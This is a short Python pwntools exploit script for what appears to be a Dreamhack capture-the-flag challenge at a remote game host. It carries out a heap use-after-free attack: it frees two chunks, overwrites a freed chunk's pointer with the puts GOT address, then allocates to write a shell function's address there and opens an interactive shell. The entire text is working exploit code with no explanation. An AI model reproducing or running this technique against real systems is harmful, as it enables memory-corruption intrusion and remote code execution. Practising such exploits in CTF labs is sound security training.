from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 9381
r = remote(HOST, PORT)

def create(size, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(size).encode())
    r.sendafter(b': ', data)

def modify(idx, size, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b': ', str(size).encode())
    r.sendlineafter(b': ', data)

def delete(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', str(idx).encode())

sh=0x401530
puts_got=0x404020

create(0x10, b'A')
create(0x10, b'A')
delete(0)
delete(1)
modify(1, 0x10, p64(puts_got))

create(0x10, b'A')
create(0x10, p64(sh))

r.interactive()